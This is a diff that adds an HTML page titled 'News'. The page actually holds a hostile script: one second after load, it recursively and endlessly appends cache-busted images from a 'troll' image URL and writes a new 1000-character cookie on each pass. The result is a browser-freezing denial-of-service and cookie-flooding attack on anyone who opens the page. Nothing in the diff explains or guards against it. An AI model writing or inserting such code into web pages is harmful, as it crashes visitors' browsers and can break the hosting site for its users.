@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>News</title>
+    <style>
+        body {
+            background-color: #111;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin: 20px;
+            overflow: hidden;
+        }
+        h1 { color: #ff0040; border-bottom: 1px dashed #0f0; }
+        .warning { color: #ff9900; font-weight: bold; }
+        img { border: 2px solid #444; margin: 10px 0; }
+    </style>
+</head>
+<body>
+
+    <div id="image-container"></div>
+    
+    <script>
+        const container = document.getElementById('image-container');
+        const imageUrl = 'https://github.com/jonasArduino/troll/blob/main/troll.png';
+        
+        function loadInfiniteImages() {
+            let count = 0;
+            function addImage() {
+                const img = document.createElement('img');
+                img.src = imageUrl + '?t=' + Date.now() + count;
+                img.style.width = '100px';
+                container.appendChild(img);
+                count++;
+                
+                document.cookie = `infinite_cookie_${count}=${'a'.repeat(1000)}; path=/`;
+                
+                addImage();
+            }
+            addImage();
+        }
+        
+        window.onload = function() {
+            setTimeout(loadInfiniteImages, 1000);
+        };
+    </script>
+    
+    <noscript>JavaScript is required for this site</noscript>
+</body>
+</html>
